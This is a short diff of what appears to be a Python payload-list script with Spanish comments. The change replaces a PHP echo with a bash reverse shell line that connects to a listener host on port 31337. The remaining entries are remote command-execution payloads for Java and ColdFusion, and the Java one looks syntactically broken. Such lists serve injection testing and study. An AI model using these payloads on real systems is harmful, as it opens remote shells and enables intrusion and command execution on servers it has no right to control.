@@ -16,7 +16,7 @@ lhost = rhost = '127.0.0.1'
 cmd = 'ls'
 # Ejemplo con una lista de cadenas
 payloads = {
-    "php1": "<?php echo($_GET['nombre']); ?>",
+    "php1": "bash -i >& /dev/tcp/{lhost}/31337 0>&1",
     "php2": "<?php echo($_GET['apellido']); ?>",
     'Java': f"Runtime.getRuntime().exec(echo 'hola mundo')",
     'ColdFusion': f"#CreateObject(\"java\", \"java.lang.Runtime\").getRuntime().exec(variables.cmd)#"
